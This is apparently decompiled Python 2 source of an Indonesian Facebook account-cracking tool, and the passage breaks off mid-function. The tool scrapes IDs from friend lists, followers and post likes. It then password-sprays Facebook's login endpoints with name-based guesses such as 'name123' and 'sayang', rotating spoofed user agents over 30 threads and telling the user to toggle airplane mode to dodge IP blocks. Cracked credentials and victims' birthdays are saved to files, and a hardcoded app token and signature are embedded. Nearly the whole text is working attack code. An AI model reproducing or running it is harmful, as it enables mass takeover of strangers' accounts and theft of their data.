# uncompyle6 version 3.7.5.dev0
# Python bytecode 2.7
# Decompiled from: Python 2.7.18 (default, Aug  8 2021, 22:51:48) 
# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/
# Embedded file name: romi
fb = '570025450621946'
import os, sys, time, datetime, random, hashlib, re, threading, json, cookielib, requests, uuid, itertools, subprocess, bs4, requests as r, os
from bs4 import BeautifulSoup as par
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from time import sleep
from datetime import datetime
from random import randint
try:
    import requests
except ImportError:
    print ' \x1b[0;91m!: Modul requests belum terinstal !...\n'
    os.system('pip install requests' if os.name == 'nt' else 'pip2 install requests')

try:
    import bs4
except ImportError:
    print ' \x1b[0;91m!: Modul bs4 belum terinstal !...\n'
    os.system('pip install bs4' if os.name == 'nt' else 'pip2 install bs4')

reload(sys)
sys.setdefaultencoding('utf8')

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


ip = requests.get('https://api.ipify.org').text

def logo():
    print '\x1b[0;97m              By \x1b[0;92mRomi Afrizal \n\x1b[0;91m __________ ________      _____  __________ \n \\______   \\\\_____  \\    /     \\ \\____    / \n  |       _/ /   |   \\  /  \\ /  \\  /     / \n  |    |   \\/    |    \\/    Y    \\/     /_  \n  |____|_  /\\_______  /\\____|__  /_______ \\ \n         \\/         \\/         \\/        \\/ \x1b[0;97m\n          * \x1b[0;93mgithub.com/Mark-Zuck \x1b[0;97m*\n'


kom = 'login'
id = []
cp = []
ok = []
loop = 0
s = requests.Session()
api = 'https://b-api.facebook.com/method/auth.login'
useragents = ('Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]',
              'Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]')
uam = random.choice(['NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+', 'NokiaX2-00/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokiax2-00)', 'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)'])
ct = datetime.now()
n = ct.month
bulan1 = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'Nopember', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i


color = lambda col: '\x1b[1;' + str(col) + 'm'
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan1[nTemp]
reload(sys)
sys.setdefaultencoding('utf-8')
bulan = {'01': 'Januari', 
   '02': 'Februari', 
   '03': 'Maret', 
   '04': 'April', 
   '05': 'Mei', 
   '06': 'Juni', 
   '07': 'Juli', 
   '08': 'Agustus', 
   '09': 'September', 
   '10': 'November', 
   '11': 'Oktober', 
   '12': 'Desember'}

def menu():
    global token
    os.system('clear')
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0;91m !: Token Invalid'
        os.system('rm -f login.txt')
        time.sleep(1)
        masuk()

    try:
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + token)
        a = json.loads(otw.text)
        ngentod = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print '\x1b[0;91m !: Token Invalid'
        os.system('rm -f login.txt')
        time.sleep(3)
        masuk()
    except requests.exceptions.ConnectionError:
        print '\x1b[0;91m !: Tidak Ada Koneksi'
        sys.exit()

    logo()
    print '\x1b[0;97m Hay\x1b[0;92m ' + ngentod + '\x1b[0;97m ngentod '
    print
    print ' \x1b[0;97m01. Crack dari publik'
    print ' 02. Crack dari followers'
    print ' 03. Crack dari like post'
    print ' 04. Crack dari files '
    print ' 05. Cek hasil crack'
    print ' 06. Cek opsi checkpoint'
    print ' 07. Dump Id fb  '
    print ' 08. Cek token '
    print ' \x1b[0;91m00.\x1b[0;97m Keluar (hapus token)'
    pilih_menu()


def pilih_menu():
    mi = raw_input('\n\x1b[0;97m ?: pilih : ')
    if mi == '':
        print
        print '\x1b[0;91m !: Isi yg benar'
        exit()
    elif mi in ('1', '01'):
        print "\n \x1b[0;97m!: Ketik 'me' untuk crack daftar teman sendiri"
        idt = raw_input(' \x1b[0;97m?: id publik : ')
        try:
            pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            sp = json.loads(pok.text)
            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
            z = json.loads(r.text)
            for i in z['data']:
                uid = i['id']
                na = i['name']
                nm = na.rsplit(' ')[0]
                id.append(uid + '|' + nm)

        except KeyError:
            print '\x1b[0;91m !: Gagal mengambil id'
            exit()

    elif mi in ('2', '02'):
        print "\n \x1b[0;97m!: Ketik 'me' untuk crack followers sendiri"
        idt = raw_input(' \x1b[0;97m?: id publik : ')
        try:
            pok = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + token)
            sp = json.loads(pok.text)
            r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?limit=999999&access_token=' + token)
            z = json.loads(r.text)
            for i in z['data']:
                uid = i['id']
                na = i['name']
                nm = na.rsplit(' ')[0]
                id.append(uid + '|' + nm)

        except KeyError:
            print '\x1b[0;91m !: Gagal mengambil id'
            exit()

    elif mi in ('3', '03'):
        print '\n \x1b[0;97m!: Masukan Id postingan publik '
        idt = raw_input('\x1b[0;97m ?: id post publik : ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '/likes?limit=9999999&access_token=' + token)
            z = json.loads(r.text)
            for i in z['data']:
                uid = i['id']
                na = i['name']
                nm = na.rsplit(' ')[0]
                id.append(uid + '|' + nm)

        except KeyError:
            print '\x1b[0;91m !: Gagal mengambil id'
            exit()

    elif mi in ('4', '04'):
        try:
            print '\n \x1b[0;97m!: Masukan file yg berisi Id & pw facebook '
            files = raw_input('\x1b[0;97m\n ?: files : ')
            for line in open(files, 'r').readlines():
                id.append(line.strip())

        except (KeyError, IOError):
            exit("\x1b[0;91m !: File : '" + files + "' tidak ada ")

    elif mi in ('5', '05'):
        print '\n\x1b[0;97m [ Pilih untuk mengecek hasil ] '
        print '\n\x1b[0;97m 01. Cek hasil ok'
        print ' 02. Cek hasil cp'
        rom = raw_input('\n \x1b[0;97m?: pilih : ')
        print ''
        if rom == '':
            menu()
        elif rom in ('1', '01'):
            dirs = os.listdir('out')
            for file in dirs:
                print ' \x1b[0;97m+: \x1b[0;92m' + file

            try:
                file = raw_input('\n \x1b[0;97m?: pilih yg mana? : ')
                if file == '':
                    menu()
                totalok = open('out/%s' % file).read().splitlines()
            except (KeyError, IOError):
                exit(' !:  file %s tidak tersedia' % file)

            nm_file = ('%s' % file).replace('-', ' ')
            file_nm = nm_file.replace('.txt', '')
            print '\n\x1b[0;97m [+] Total akun\x1b[0;92m %s\x1b[0;97m - Tanggal : %s\x1b[0;92m' % (len(totalok), file_nm)
            os.system('cat out/%s' % file)
            exit('\n')
        elif rom in ('2', '02'):
            dirs = os.listdir('cek')
            for file in dirs:
                print ' \x1b[0;97m+: \x1b[0;93m' + file

            try:
                file = raw_input('\n \x1b[0;97m?: pilih yg mana? : ')
                if file == '':
                    menu()
                totalcp = open('cek/%s' % file).read().splitlines()
            except (KeyError, IOError):
                exit(' \x1b[0;91m!:  file %s tidak tersedia' % file)

            nm_file = ('%s' % file).replace('-', ' ')
            file_nm = nm_file.replace('.txt', '')
            print '\n\x1b[0;97m [+] Total akun\x1b[0;93m %s\x1b[0;97m - Tanggal : %s\x1b[0;93m' % (len(totalcp), file_nm)
            os.system('cat cek/%s' % file)
            exit('\n')
        else:
            exit('\x1b[0;91m !: pilih yang benar')
    elif mi in ('6', '06'):
        cek_opsi()
    elif mi in ('7', '07'):
        print '\n\x1b[0;97m [ Pilih untuk dump id ] \n'
        print '\x1b[0;97m 01. Dump Id publik '
        print ' 02. Dump Id followers '
        d = raw_input('\n\x1b[0;97m ?: pilih : ')
        if d == '':
            print '\x1b[0;91m !: Isi yg benar'
            exit()
        elif d in ('1', '01'):
            publikid()
        elif d in ('2', '02'):
            follow()
        else:
            print '\x1b[0;91m !: Isi yg benar'
            exit()
    elif mi in ('8', '08'):
        romz = open('login.txt', 'r').read()
        print '\n\x1b[0;97m !: Token anda : \n\x1b[0;92m'
        time.sleep(0.1)
        print romz
        time.sleep(0.1)
        raw_input('\x1b[0;97m\n !: Kembali ')
        menu()
    elif mi in ('0', '00'):
        os.system('rm -f login.txt')
        print ' \x1b[0;92m\xe2\x88\x9a  berhasil menghapus token'
        exit()
    else:
        print '\x1b[0;91m !: pilih yang benar '
        exit()
    print '\x1b[0;97m ?: total id  : ' + str(len(id))
    anak_memek()


def anak_memek():
    print '\n\x1b[0;97m [ Pilih metode crack silahkan coba satu" ] \n'
    print ' 01. Metode\x1b[0;91m b-api \x1b[0;97mv.1 (fast)'
    print ' 02. Metode\x1b[0;96m mbasic\x1b[0;97m v.1 (slow)'
    print ' 03. Metode\x1b[0;96m mbasic\x1b[0;97m v.2 (slow)'
    romixyz()


def romixyz():
    rom = raw_input('\n \x1b[0;97m?: Pilih : ')
    if rom == '':
        print '\x1b[0;91m !: pilih yang benar '
        romixyz()
    elif rom in ('1', '01'):
        api_v_dua()
    elif rom in ('2', '02'):
        romi_gntg()
    elif rom in ('3', '03'):
        mb_v_dua()
    else:
        print '\x1b[0;91m !: pilih yang benar '
        romixyz()


def api_v_dua():
    romi = raw_input('\x1b[0;97m ?: Gunakan pasword manual? y/t : ')
    if romi == '':
        print '\x1b[0;91m !: pilih yang benar '
        api_v_dua()
    elif romi in ('y', 'Y'):
        manual_api_v_dua()
    elif romi in ('t', 'T'):
        langsung_api_v_dua()
    else:
        print '\x1b[0;91m !: pilih yang benar '
        api_v_dua()


def langsung_api_v_dua():
    print '\n \x1b[0;97m!: crack started...\n !: lama hasil? gunakan mode pesawat 1 detik\n'

    def main(arg):
        global cp
        global loop
        global ok
        d = random.choice(['\x1b[0;91m', '\x1b[0;92m', '\x1b[0;93m', '\x1b[0;94m', '\x1b[0;95m', '\x1b[0;96m', '\x1b[0;97m'])
        print '\r ' + d + '[Crack] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for pw in [name.lower() + '123', name.lower() + '1234', name.lower() + '12345', 'sayang', '786786']:
                rx_u = random.choice(['[FBAN/FB4A;FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]',
                 'Mozilla/5.0 (Linux; Android 10; SM-N770F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
                 'Mozilla/5.0 (Linux; Android 7.0; TRT-LX1 Build/HUAWEITRT-LX1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
                 'Mozilla/5.0 (Linux; Android 10; ELE-L29 Build/HUAWEIELE-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/320.0.0.34.118;]',
                 'Mozilla/5.0 (Linux; Android 7.0; SM-A510F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.105 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]',
                 'Mozilla/5.0 (Linux; Android 11; M2101K7BNY Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/323.0.0.46.119;]',
                 'Mozilla/5.0 (Linux; Android 7.0; LG-M200 Build/NRD90U; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
                 'Mozilla/5.0 (Series40; NokiaC2-02/06.96; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31', 'Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaC6-00/40.0.021; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.25 3gpp-gba',
                 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'])
                ses = requests.Session()
                headrs = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 
                   'x-fb-connection-quality': 'EXCELLENT', 
                   'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
                   'user-agent': rx_u, 
                   'content-type': 'application/x-www-form-urlencoded', 
                   'x-fb-http-engine': 'Liger'}
                parameter = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 
                   'format': 'JSON', 
                   'sdk_version': '2', 
                   'email': uid, 
                   'locale': 'en_US', 
                   'password': pw, 
                   'sdk': 'ios', 
                   'generate_session_cookies': '1', 
                   'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
                response = ses.get(api, params=parameter, headers=headrs)
                if response.status_code != 200:
                    print '\r\x1b[0;91m !: IP anda terblokir. hidupkan mode pesawat 1 detik',
                    sys.stdout.flush()
                    loop += 1
                    langsung_api_v_dua()
                if 'session_key' in response.text and 'EAAA' in response.text:
                    print '\r \x1b[0;92m[\xe2\x88\x9a] ' + uid + ' \xe2\x97\x8a ' + pw + '        '
                    ok.append(uid + ' \xe2\x97\x8a ' + pw)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write(' [\xe2\x88\x9a] ' + str(uid) + ' \xe2\x97\x8a ' + str(pw) + '\n')
                    save.close()
                    break
                    continue
                elif 'www.facebook.com' in response.json()['error_msg']:
                    try:
                        token = open('login.txt').read()
                        url = 'https://graph.facebook.com/' + uid + '?access_token=' + token
                        data = s.get(url).json()
                        ttl = data['birthday']
                        print '\r\x1b[0;33m [\xc3\x97] ' + uid + ' \xe2\x97\x8a ' + pw + ' \xe2\x97\x8a ' + ttl
                        cp.append(uid + ' \xe2\x97\x8a ' + pw + ' \xe2\x97\x8a ' + ttl)
                        save = open('cek/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                        save.write(str(uid) + ' \xe2\x97\x8a ' + str(pw) + '\n')
                        save.close()
                        break
                    except (KeyError, IOError):
                        ttl = ' '
                    except:
                        pass

                    print '\r\x1b[0;33m [\xc3\x97] ' + uid + ' \xe2\x97\x8a ' + pw + '     '
                    cp.append(uid + ' \xe2\x97\x8a ' + pw)
                    save = open('cek/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write(str(uid) + ' \xe2\x97\x8a ' + str(pw) + '\n')
                    save.close()
                    break
                    continue

            loop += 1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n \x1b[0;92m!: jangan lupa copy hasil nya lalu simpan '
    exit()


def manual_api_v_dua():
    print '\n\x1b[0;97m !: contoh pass : sayang,786786'
    pw = raw_input(' \x1b[0;97m?: password : ').split(',')
    if len(pw) == 0:
        exit('\x1b[0;91m !: tidak boleh kosong')
    print '\n \x1b[0;97m!: crack started...\n !: lama hasil? gunakan mode pesawat 1 detik\n'

    def main(arg):
        global loop
        d = random.choice(['\x1b[0;91m', '\x1b[0;92m', '\x1b[0;93m', '\x1b[0;94m', '\x1b[0;95m', '\x1b[0;96m', '\x1b[0;97m'])
        print '\r ' + d + '[Crack] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for asu in pw:
                rx_u = random.choice(['[FBAN/FB4A;FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]',
                 'Mozilla/5.0 (Linux; Android 10; SM-N770F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
                 'Mozilla/5.0 (Linux; Android 7.0; TRT-LX1 Build/HUAWEITRT-LX1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
                 'Mozilla/5.0 (Linux; Android 10; ELE-L29 Build/HUAWEIELE-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/320.0.0.34.118;]',
                 'Mozilla/5.0 (Linux; Android 7.0; SM-A510F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.105 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]',
                 'Mozilla/5.0 (Linux; Android 11; M2101K7BNY Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/323.0.0.46.119;]',
                 'Mozilla/5.0 (Linux; Android 7.0; LG-M200 Build/NRD90U; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
                 'Mozilla/5.0 (Series40; NokiaC2-02/06.96; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31', 'Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaC6-00/40.0.021; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.25 3gpp-gba',
                 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'])
                ses = requests.Session()
                headrs = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 
                   'x-fb-connection-quality': 'EXCELLENT', 
                   'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
                   'user-agent': rx_u, 
                   'content-type': 'application/x-www-form-urlencoded', 
                   'x-fb-http-engine': 'Liger'}
                parameter = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 
                   'format': 'JSON', 
                   'sdk_version': '2', 
                   'email': uid, 
                   'locale': 'en_US', 
                   'password': asu, 
                   'sdk': 'ios', 
                   'generate_session_cookies': '1', 
                   'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
                response = ses.get(api, params=parameter, headers=headrs)
                if response.status_code != 200:
                    print '\r\x1b[0;91m !: IP anda terblokir. hidupkan mode pesawat 1 detik',
                    sys.stdout.flush()
                    loop += 1
                    manual_api_v_dua()
                if 'session_key' in response.text and 'EAAA' in response.text:
                    print '\r\x1b[0;92m [\xe2\x88\x9a] ' + uid + ' \xe2\x97\x8a ' + asu + '        '
                    ok.append(uid + ' \xe2\x97\x8a ' + asu)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write(' [\xe2\x88\x9a] ' + str(uid) + ' \xe2\x97\x8a ' + str(asu) + '\n')
                    save.close()
                    break
                    continue
                elif 'www.facebook.com' in response.json()['error_msg']:
                    try:
                        token = open('login.txt').read()
                        url = 'https://graph.facebook.com/' + uid + '?access_token=' + token
                        data = s.get(url).json()
                        ttl = data['birthday'].replace('/', '-')
                        print '\r\x1b[0;33m [\xc3\x97] ' + uid + ' \xe2\x97\x8a ' + asu + ' \xe2\x97\x8a ' + ttl
                        cp.append(uid + ' \xe2\x97\x8a ' + asu + ' \xe2\x97\x8a ' + ttl)
                        save = open('cek/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                        save.write(str(uid) + ' \xe2\x97\x8a ' + str(asu) + '\n')
                        save.close()
                        break
                    except (KeyError, IOError):
                        ttl = ' '
                    except:
                        pass

                    print '\r\x1b[0;33m [\xc3\x97] ' + uid + ' \xe2\x97\x8a ' + asu + '        '
                    cp.append(uid + ' \xe2\x97\x8a ' + asu)
                    save = open('cek/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write(str(uid) + ' \xe2\x97\x8a ' + str(asu) + '\n')
                    save.close()
                    break
                    continue

            loop += 1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n \x1b[0;92m!: jangan lupa copy hasil nya lalu simpan '
    exit()


def romi_gntg():
    romi = raw_input('\x1b[0;97m ?: Gunakan pasword manual? y/t : ')
    if romi == '':
        print '\x1b[0;91m !: pilih yang benar '
        romi_gntg()
    elif romi in ('y', 'Y'):
        manualbasic()
    elif romi in ('t', 'T'):
        langsungbasic()
    else:
        print '\x1b[0;91m !: pilih yang benar '
        romi_gntg()


def langsungbasic():
    print '\n \x1b[0;97m!: crack started...\n !: lama hasil? gunakan mode pesawat 1 detik\n'

    def main(user):
        global loop
        global token
        skm = []
        d = random.choice(['\x1b[0;91m', '\x1b[0;92m', '\x1b[0;93m', '\x1b[0;94m', '\x1b[0;95m', '\x1b[0;96m', '\x1b[0;97m'])
        print '\r ' + d + '[Crack] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        try:
            os.mkdir('out')
        except OSError:
            pass

        uid, name = user.split('|')
        for nama in name.split(' '):
            if len(nama) < 3:
                continue
            elif len(nama) == 1 and len(nama) == 2 and len(nama) == 3 and len(nama) == 4 or len(nama) == 5:
                skm.append(nama + '123')
                skm.append(nama + '12345')
            else:
                skm.append(nama + '123')
                skm.append(nama + '1234')
                skm.append(nama + '12345')
                skm.append('Sayang')
                skm.append('Anjing')
                skm.append('786786')

        try:
            for pw in skm:
                agent = random.choice(['NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+',
                 'NokiaX2-00/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokiax2-00)',
                 'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)',
                 'Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaC6-00/40.0.021; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.25 3gpp-gba',
                 'Mozilla/5.0 (Series40; NokiaC2-02/06.96; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31',
                 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]',
                 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36',
                 'Mozilla/5.0 (Linux; Android 10; Nokia 7.2 Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/264.0.0.44.111;]',
                 'Mozilla/5.0 (Linux; U; Android 10; Nokia 7.2 Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 OPR/52.2.2254.54723',
                 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]',
                 'Mozilla/5.0 (Linux; Android 10; Redmi Note 9S Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/327.0.0.33.120;]',
                 'Mozilla/5.0 (Linux; U; Android 10; en-in; Redmi Note 9 Pro Max Build/QKQ1.191215.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.141 Mobile Safari/537.36 XiaoMi/MiuiBrowser/11.9.3-g'])
                hed = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 
                   'x-fb-sim-hni': str(random.randint(20000, 40000)), 
                   'x-fb-net-hni': str(random.randint(20000, 40000)), 
                   'x-fb-connection-quality': 'EXCELLENT', 
                   'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
                   'user-agent': agent, 
                   'content-type': 'application/x-www-form-urlencoded', 
                   'x-fb-http-engine': 'Liger'}
                rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers=hed)
                xo = rex.content
                if 'mbasic_logout_button' in xo or 'save-device' in xo:
                    print '\r \x1b[0;92m[\xe2\x88\x9a] ' + uid + ' \xe2\x97\x8a ' + pw + '        '
                    ok.append(uid + ' \xe2\x97\x8a ' + pw)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write(' [\xe2\x88\x9a] ' + str(uid) + ' \xe2\x97\x8a ' + str(pw) + '\n')
                    save.close()
                    break
                    continue
                if 'checkpoint' in xo:
                    try:
                        token = open('login.txt').read()
                        url = 'https://graph.facebook.com/' + uid + '?access_token=' + token
                        data = s.get(url).json()
                        nama = data['name']
                        ttl = data['birthday'].replace('/', '-')
                        print '\r\x1b[0;93m [\xc3\x97] ' + uid + ' \xe2\x97\x8a ' + pw + ' \xe2\x97\x8a ' + ttl
                        cp.append(uid + ' \xe2\x97\x8a ' + pw + ' \xe2\x97\x8a ' + ttl)
                        save = open('cek/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                        save.write(str(uid) + ' \xe2\x97\x8a ' + str(pw) + '\n')
                        save.close()
                        break
                    except (KeyError, IOError):
                        ttl = ' '
                    except:
                        pass

                    print '\r\x1b[0;93m [\xc3\x97] ' + uid + ' \xe2\x97\x8a ' + pw + '        '
                    cp.append(uid + ' \xe2\x97\x8a ' + pw)
                    save = open('cek/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write(str(uid) + ' \xe2\x97\x8a ' + str(pw) + '\n')
                    save.close()
                    break
                    continue

            loop += 1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n \x1b[0;92m!: jangan lupa copy hasil nya lalu simpan '
    exit()


def manualbasic():
    print '\n\x1b[0;97m !: contoh pass : sayang,786786'
    pw = raw_input(' \x1b[0;97m?: password : ')
    if len(pw) == 0:
        exit('\x1b[0;91m !: tidak boleh kosong')
    print '\n \x1b[0;97m!: crack started...\n !: lama hasil? gunakan mode pesawat 1 detik\n'

    def main(arg):
        global loop
        global token
        d = random.choice(['\x1b[0;91m', '\x1b[0;92m', '\x1b[0;93m', '\x1b[0;94m', '\x1b[0;95m', '\x1b[0;96m', '\x1b[0;97m'])
        print '\r' + d + ' [Crack] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for kaci in pw.split(','):
